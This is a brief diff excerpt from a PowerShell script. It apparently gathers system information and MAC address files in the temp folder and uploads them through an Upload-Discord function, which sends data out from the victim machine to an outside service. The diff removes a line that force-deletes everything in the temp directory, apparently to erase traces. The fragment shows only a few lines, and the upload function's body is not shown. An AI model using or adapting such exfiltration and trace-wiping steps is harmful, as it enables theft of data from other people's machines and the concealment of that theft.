@@ -61,7 +61,6 @@ Upload-Discord -file $env:TMP\systeminfo.txt
 Upload-Discord -file $env:TMP\mac.txt
 
 
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 
 
